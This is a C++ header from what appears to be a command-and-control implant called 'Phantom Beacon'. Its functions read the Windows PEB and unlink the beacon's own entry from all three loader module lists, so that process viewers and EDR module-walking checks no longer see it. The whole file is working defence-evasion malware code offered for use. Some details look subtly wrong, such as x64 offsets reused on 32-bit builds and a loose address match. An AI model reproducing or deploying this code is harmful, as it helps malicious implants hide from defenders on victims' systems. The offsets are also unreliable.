#pragma once
// ============================================================================
//  peb_unlink.h — Phantom Beacon PEB Module Unlink
//  ──────────────────────────────────────────────────────────────────
//  Removes the beacon's own module entry from the PEB's three module
//  lists (InLoadOrder, InMemoryOrder, InInitializationOrder). Tools that
//  enumerate loaded modules via the PEB (Process Hacker, Process Explorer,
//  and many EDR "module walking" heuristics) no longer see the beacon.
//
//  The module stays mapped and executing — only the linked-list bookkeeping
//  is severed. This is the same technique Cobalt Strike's reflective loader
//  uses to make an injected DLL invisible.
//
//  NOTE: The entry is unlinked by patching the Flink/Blink pointers of the
//  neighbouring entries. We never free or unmount anything, so no memory
//  corruption occurs; if the process later calls LdrLoadDll on something,
//  the lists remain structurally valid for other modules.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include "evasion.h"

namespace peb_unlink {

// Forward-declare list-entry helpers (LIST_ENTRY uses Flink/Blink).
// We work with the raw offsets to avoid depending on ntdll symbols.

/// Unlink the current module from the PEB's InMemoryOrderModuleList.
/// Returns true if the module was found and unlinked.
inline bool unlink_from_memory_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    // InMemoryOrderModuleList is the 2nd list in PEB_LDR_DATA.
    // LDR_DATA_STRUCTURE layout (x64):
    //   +0x00 Length
    //   +0x08 Initialized
    //   +0x10 SsHandle
    //   +0x18 InLoadOrderModuleList
    //   +0x28 InMemoryOrderModuleList
    //   +0x38 InInitializationOrderModuleList
    auto ldr = peb->Ldr;
    auto* inMemoryHead = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x28);

    // Find our own module entry. The InMemoryOrderLinks field sits at
    // offset 0x10 into the LDR_DATA_TABLE_ENTRY (for the memory-order list).
    // We identify "ours" as the entry whose DllBase matches our image base.
    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_memory_order);

    for (PLIST_ENTRY e = inMemoryHead->Flink; e != inMemoryHead; e = e->Flink) {
        // LDR_DATA_TABLE_ENTRY* = entry - 0x10 (InMemoryOrderLinks offset)
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x10;
        // DllBase is at +0x30
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);

        // Match by containing address: our function pointer must fall inside
        // this module's image range. A conservative check: compare high bits
        // and require ourBase >= dllBase (within 1GB of the base).
        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
            // Unlink: Flink->Blink = Blink; Blink->Flink = Flink
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            // Break our own links (not strictly required, but hygienic)
            e->Flink = e;
            e->Blink = e;
            return true;
        }
    }
    return false;
}

/// Unlink the current module from the InLoadOrderModuleList.
inline bool unlink_from_load_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    auto ldr = peb->Ldr;
    auto* inLoadHead = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x18);

    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_load_order);

    for (PLIST_ENTRY e = inLoadHead->Flink; e != inLoadHead; e = e->Flink) {
        // InLoadOrderLinks is at offset 0x00 of LDR_DATA_TABLE_ENTRY
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x00;
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);

        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            e->Flink = e;
            e->Blink = e;
            return true;
        }
    }
    return false;
}

/// Unlink the current module from the InInitializationOrderModuleList.
inline bool unlink_from_init_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    auto ldr = peb->Ldr;
    auto* inInitHead = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x38);

    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_init_order);

    for (PLIST_ENTRY e = inInitHead->Flink; e != inInitHead; e = e->Flink) {
        // InInitializationOrderLinks is at offset 0x20 of LDR_DATA_TABLE_ENTRY
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x20;
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);

        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            e->Flink = e;
            e->Blink = e;
            return true;
        }
    }
    return false;
}

/// Unlink the beacon module from all three PEB module lists.
/// Safe to call once at startup (idempotent).
inline void hide_module() {
    unlink_from_memory_order();
    unlink_from_load_order();
    unlink_from_init_order();
}

}  // namespace peb_unlink
#endif
